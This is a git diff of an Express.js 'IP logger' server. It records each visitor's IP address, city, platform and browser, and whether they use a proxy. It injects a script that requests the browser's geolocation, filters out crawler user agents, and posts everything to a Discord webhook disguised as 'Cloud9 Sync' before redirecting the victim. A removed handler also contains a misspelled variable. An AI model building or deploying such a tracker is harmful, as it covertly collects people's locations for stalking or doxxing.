@@ -5,6 +5,7 @@ const app = express();
 
 const { sendWebhook } = require("./webhook");
 const { MessageBuilder } = require("discord-webhook-node");
+
 const channelID = process.env.channel_id;
 const ip_token = process.env.ip_token;
 const port = process.env.port || 3000;
@@ -20,8 +21,16 @@ const script = `
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({ latitude, longitude }),
+      }).then(() => {
+        console.log('Location logged successfully');
+        window.location.href = '${process.env.redirect_url}';
+      }).catch((error) => {
+        console.error('Error logging location:', error);
       });
     });
+  } else {
+    console.log('Geolocation is not supported by this browser.');
+    window.location.href = '${process.env.redirect_url}';
   }
 `;
 
@@ -29,16 +38,26 @@ app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
   const isUnwantedUserAgent = unwantedUserAgents.some(unwantedUserAgent => userAgent.includes(unwantedUserAgent));
-  if (isUnwantedUserAgent) { res.status(200).send("Skipping unwanted User Agent"); return; }
+  if (isUnwantedUserAgent) { 
+    res.status(200).send("Skipping unwanted User Agent"); 
+    console.log("Skipping unwanted User Agent");
+    return; 
+  }
+
   const { region, city, country, postal } = await (await fetch(`https://ipinfo.io/${ipAddress}?token=${ip_token}`)).json();
   const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
   const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
   const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
+  
   try { 
     if (!isUnwantedUserAgent) {
-      res.write(`<script>${script}</script>`);
+      res.send(`<script>${script}</script>`);
+      console.log("Client-side script sent");
+    } else {
+      res.redirect(process.env.redirect_url);
     }
+
     const embed = new MessageBuilder()
       .setTitle("Cloud9 Sync")
       .setDescription("New address logged.")
@@ -54,26 +73,13 @@ app.get("/", async (req, res) => {
       .addField("Proxy/VPN", isProxy ? "Yes" : "No")
       .setColor("#5CDBF0")
       .setTimestamp();
+      
     await sendWebhook(channelID, embed);
 
-    res.redirect(process.env.redirect_url);
   } catch (error) {
     console.error(`Error handling request:\n${error.stack}`);
     res.status(500).send("Internal server error");
   }
 });
 
-app.post("/location", async (req, res) => {
-  const { latitude, longitude } = req.body;
-  const location = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${latditude}+${longitude}&key=${opencage_api_key}`);
-  const locationData = await location.json();
-  const detailedLocation = locationData.results[0].formatted;
-
-    const embed = new MessageBuilder()
-    .addField("Detailed Location", detailedLocation)
-
-    await sendWebhook(channelID, embed);
-  res.status(200).end();
-});
-  
 app.listen(port, () => console.log(`App listening at http://localhost:${port}`));
